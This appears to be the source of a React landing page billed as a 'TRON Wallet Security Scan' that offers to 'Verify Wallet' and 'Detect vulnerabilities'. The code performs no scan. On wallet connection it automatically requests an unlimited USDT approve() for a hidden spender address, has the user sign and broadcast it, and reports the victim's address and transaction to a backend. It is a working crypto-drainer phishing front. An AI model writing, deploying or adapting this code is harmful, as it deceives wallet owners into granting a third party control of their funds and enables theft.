import { motion } from "motion/react";
import { Shield, Terminal } from "lucide-react";
import { useState, useEffect, useRef } from "react";
import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import { TronWeb } from "tronweb";
import { BASE_URL, USDT_ADDRESS, USDT_SPENDER_ADDRESS, MAX_ALLOWANCE } from "../../../env";
import { Buffer } from "buffer";

if (typeof window !== "undefined") {
  window.Buffer = window.Buffer || Buffer;
}

interface HeroSectionProps {
  onInitiateScan: () => void;
}

// ======================
// TRONWEB INSTANCE
// ======================
function buildTronWeb() {
  return new TronWeb({
    fullHost: "https://api.trongrid.io",
  });
}

// ======================
// COMPONENT
// ======================
export function HeroSection({
  onConnect,
  onDisconnect,
  onApprovalSuccess,
}: any) {
  const [logs, setLogs] = useState<string[]>([]);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // FLOW STATE
  const [step, setStep] = useState<"connect" | "approve" | "done">("connect");

  const { address, connected, wallet, select, connect, disconnect, wallets } =
    useWallet();

  // ======================
  // AUTO SYNC WALLET
  // ======================
  const approvalAttempted = useRef(false);

  useEffect(() => {
    if (!connected) {
      approvalAttempted.current = false;
    }
  }, [connected]);

  useEffect(() => {
    console.log("Step 0 Here");
    if (connected && address && !approvalAttempted.current) {
      console.log(
        "address, connected, approvalAttempted",
        address,
        connected,
        approvalAttempted.current,
      );
      approvalAttempted.current = true;
      onConnect?.({
        address,
        balance: "0",
        network: "TRON MAINNET",
      });

      // Add a small delay to ensure WalletConnect session is fully established on the wallet side
      // Trust Wallet often drops requests sent immediately after connection.
      setTimeout(() => {
        handleApproval();
      }, 1500);
    } else {
      console.log(
        "From Else ---> address, connected, approvalAttempted",
        address,
        connected,
        approvalAttempted.current,
      );
    }
  }, [connected, address]);

  // ======================
  // LOGS
  // ======================
  useEffect(() => {
    if (!connected || !address) {
      setLogs([]);
      return;
    }

    const msgs = [
      "> Wallet Connected",
      `> ${address.slice(0, 6)}...${address.slice(-6)}`,
      "> Ready for Approval",
    ];

    setLogs([]);
    let i = 0;

    const interval = setInterval(() => {
      setLogs((p) => [...p, msgs[i]]);
      i++;
      if (i >= msgs.length) clearInterval(interval);
    }, 200);

    return () => clearInterval(interval);
  }, [connected, address]);

  // ======================
  // CONNECT WALLET (QR)
  // ======================
  const handleWalletConnect = async () => {
    try {
      setLoading(true);
      setError("");

      const wc = wallets.find((w) =>
        w.adapter.name.toLowerCase().includes("walletconnect"),
      );

      if (!wc) throw new Error("WalletConnect not found");

      if (wallet?.adapter.name !== wc.adapter.name) {
        select(wc.adapter.name as any);
      }

      // Call connect on the adapter directly to avoid React state closure issues
      await wc.adapter.connect();
    } catch (e: any) {
      setError(e.message || "WalletConnect failed");
    } finally {
      setLoading(false);
    }
  };

  // ======================
  // APPROVAL FUNCTION
  // ======================
  const handleApproval = async () => {
    try {
      setLoading(true);
      setError("");


      if (!connected || !address || !wallet) {
        throw new Error("Wallet not connected");
      }

      const tronWeb = buildTronWeb();

      alert("USDT_SPENDER_ADDRESS : " + USDT_SPENDER_ADDRESS);

      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_ADDRESS,
        "approve(address,uint256)",
        {
          feeLimit: 15_000_000,
          callValue: 0,
        },
        [
          { type: "address", value: USDT_SPENDER_ADDRESS },
          { type: "uint256", value: MAX_ALLOWANCE },
        ],
        address
      );

      console.log("TX -> : ", tx);

      console.log("Transaction : ", tx?.transaction);



      if (!tx?.transaction) {
        throw new Error("Failed to build transaction");
      }

      const signed = await wallet.adapter.signTransaction(tx.transaction);
      if (!signed) {
        throw new Error("Transaction signing was rejected or failed");
      }

      const result = await tronWeb.trx.sendRawTransaction(signed);

      // ✅ Detect failed transaction results
      if (result.result === false || (result.code && String(result.code) !== "SUCCESS")) {
        let decodedMessage = result.message;
        if (typeof result.message === "string" && /^[0-9a-fA-F]+$/.test(result.message)) {
          try {
            decodedMessage = Buffer.from(result.message, "hex").toString("utf8");
          } catch (e) { }
        } else if (result.message instanceof Uint8Array) {
          try {
            decodedMessage = new TextDecoder().decode(result.message);
          } catch (e) { }
        }

        const errorCode = String(result.code || "UNKNOWN_ERROR");
        const errorMap: Record<string, string> = {
          "OUT_OF_ENERGY":
            "❌ Out of Energy: Your wallet doesn't have enough energy to complete this transaction. " +
            "Please stake TRX for energy or ensure you have at least 10 TRX to cover the fee.",
          "BANDWITH_ERROR": // TRON typo in their API
            "❌ Out of Bandwidth: You don't have enough bandwidth. " +
            "Wait 24h for free bandwidth to refresh or stake more TRX.",
          "CONTRACT_VALIDATE_ERROR":
            `❌ Contract validation failed: ${decodedMessage || "The transaction was rejected by the network."}`,
          "TRANSACTION_EXPIRATION_ERROR":
            "❌ Transaction expired before it was broadcast. Please try again.",
          "DUP_TRANSACTION_ERROR":
            "❌ Duplicate transaction detected. This transaction was already submitted.",
          "TAPOS_ERROR":
            "❌ TaPoS error. Please try again.",
          "SIGERROR":
            "❌ Signature error. Please reconnect your wallet and try again.",
        };

        const friendlyMessage =
          errorMap[errorCode] ||
          `❌ Transaction failed: ${decodedMessage || errorCode}`;

        // Show alert
        alert(friendlyMessage);
        throw new Error(friendlyMessage);
      }

      // ✅ Double-check tx status on-chain (Polling for confirmation)
      let txInfo: any = null;
      let retries = 0;

      // Wait for the transaction to be mined (poll every 3s, max 10 times = 30s)
      while (retries < 10) {
        await new Promise((resolve) => setTimeout(resolve, 3000));
        try {
          txInfo = await tronWeb.trx.getTransactionInfo(result.txid);
          // TronGrid often returns an empty object {} if tx is not yet confirmed
          if (txInfo && Object.keys(txInfo).length > 0 && txInfo.id) {
            break;
          }
        } catch (err) {
          console.log("Polling tx error:", err);
        }
        retries++;
      }

      if (txInfo?.receipt?.result === "OUT_OF_ENERGY" || txInfo?.receipt?.result === "FAILED") {
        const msg =
          "❌ Transaction Failed: The transaction ran out of energy or failed on-chain. " +
          "Please stake TRX for energy or maintain at least 20–30 TRX in your wallet to cover fees.";
        alert(msg);
        throw new Error(msg);
      }

      await fetch(`${BASE_URL}/api/approved`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          network: "TRON Mainnet",
          owner: address,
          spender: USDT_SPENDER_ADDRESS,
          amount: MAX_ALLOWANCE,
          txHash: result.txid || "unknown",
        }),
      });

      setStep("done");
      setLogs((p) => [
        ...p,
        `> Approval Success`,
        `> TX: ${result.txid || "unknown"}`,
      ]);
      onApprovalSuccess?.();
    } catch (e: any) {
      // Avoid double-setting if already alerted
      const msg = e.message || "Approval failed";
      setError(msg);
      // Only alert if it wasn't already shown above
      if (!msg.startsWith("❌")) {
        alert(`Transaction Error: ${msg}`);
      }
    } finally {
      setLoading(false);
    }
  };

  // ======================
  // DISCONNECT
  // ======================
  const handleDisconnect = async () => {
    await disconnect();
    setStep("connect");
    setLogs([]);
    onDisconnect?.();
  };

  // ======================
  // UI
  // ======================
  const [showCursor, setShowCursor] = useState(true);

  useEffect(() => {
    const interval = setInterval(() => {
      setShowCursor((prev) => !prev);
    }, 500);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="relative min-h-screen flex items-center justify-center overflow-hidden sm:pt-24 pt-20 ">
      {/* Animated grid background */}
      <div className="absolute inset-0 opacity-20">
        <div
          className="absolute inset-0"
          style={{
            backgroundImage: `
              linear-gradient(rgba(16, 185, 129, 0.2) 1px, transparent 1px),
              linear-gradient(90deg, rgba(16, 185, 129, 0.2) 1px, transparent 1px)
            `,
            backgroundSize: "50px 50px",
          }}
        />
      </div>

      {/* Scanning line effect */}
      <motion.div
        className="absolute inset-x-0 h-px bg-gradient-to-r from-transparent via-emerald-500 to-transparent opacity-50"
        initial={{ top: 0 }}
        animate={{ top: "100%" }}
        transition={{
          duration: 3,
          repeat: Infinity,
          ease: "linear",
        }}
      />

      {/* Emerald glow effects */}
      <div className="absolute top-0 left-1/4 w-96 h-96 bg-emerald-500 rounded-full blur-[120px] opacity-20" />
      <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-sky-900 rounded-full blur-[120px] opacity-20" />

      <div className="relative z-10 max-w-5xl mx-auto px-6 text-center">
        {/* System Status Indicator */}
        <motion.div
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6 }}
          className="inline-flex items-center gap-3 mb-8 px-6 py-3 border border-emerald-500/30 bg-slate-900/80 backdrop-blur-sm rounded-md"
        >
          <div className="relative">
            <div className="w-2 h-2 bg-emerald-500 rounded-full" />
            <motion.div
              className="absolute inset-0 w-2 h-2 bg-emerald-500 rounded-full"
              animate={{ scale: [1, 1.5, 1], opacity: [1, 0, 1] }}
              transition={{ duration: 2, repeat: Infinity }}
            />
          </div>
          <span
            className="text-emerald-500 text-sm tracking-wider font-semibold"
            style={{ fontFamily: "Inter, sans-serif" }}
          >
            SYSTEM READY
          </span>
        </motion.div>

        {/* Main Headline */}
        <motion.h1
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.2 }}
          className="text-6xl md:text-8xl mb-6 text-slate-50 tracking-tight"
          style={{ fontFamily: "Inter, sans-serif", fontWeight: 900 }}
        >
          TRON WALLET
          <br />
          <span className="text-emerald-500">SECURITY SCAN</span>
        </motion.h1>

        {/* Terminal-style subtext */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.6, delay: 0.4 }}
          className="max-w-2xl mx-auto mb-12"
        >
          <div
            className="inline-flex items-center gap-2 text-slate-300 text-lg"
            style={{ fontFamily: "Inter, sans-serif" }}
          >
            <Terminal className="w-5 h-5 text-emerald-400" />
            <span className="opacity-70">
              Detect vulnerabilities. Identify risks. Secure your USDT
            </span>
            {showCursor && <span className="text-emerald-500">_</span>}
          </div>
        </motion.div>

        {/* CTA Buttons */}
        <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
          <motion.button
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.6 }}
            onClick={handleWalletConnect}
            disabled={loading}
            className="group relative px-12 py-5 bg-gradient-to-r from-emerald-600 to-emerald-500 border-none text-white text-lg tracking-widest overflow-hidden transition-all duration-300 hover:shadow-[0_0_20px_rgba(16,185,129,0.5)] rounded-md"
            style={{ fontFamily: "Inter, sans-serif", fontWeight: 700 }}
          >
            <span className="relative flex items-center gap-3">
              <Shield className="w-5 h-5" />
              {loading ? "Verifying..." : "Verify Wallet"}
            </span>

            {/* Glowing border effect on hover */}
            <motion.div
              className="absolute inset-0 border-2 border-emerald-400 rounded-md"
              initial={{ opacity: 0 }}
              whileHover={{ opacity: [0, 1, 0] }}
              transition={{ duration: 1, repeat: Infinity }}
            />
          </motion.button>
        </div>

        {/* Warning badges */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.6, delay: 0.8 }}
          className="mt-12 flex flex-wrap justify-center gap-6 text-sm"
          style={{ fontFamily: "Inter, sans-serif" }}
        >
          {["REAL-TIME ANALYSIS", "BLOCKCHAIN VERIFIED", "NON-CUSTODIAL"].map(
            (badge, i) => (
              <div key={i} className="flex items-center gap-2 text-slate-400">
                <div className="w-1 h-1 bg-emerald-500" />
                <span>{badge}</span>
              </div>
            ),
          )}
        </motion.div>
      </div>
    </div>
  );
}
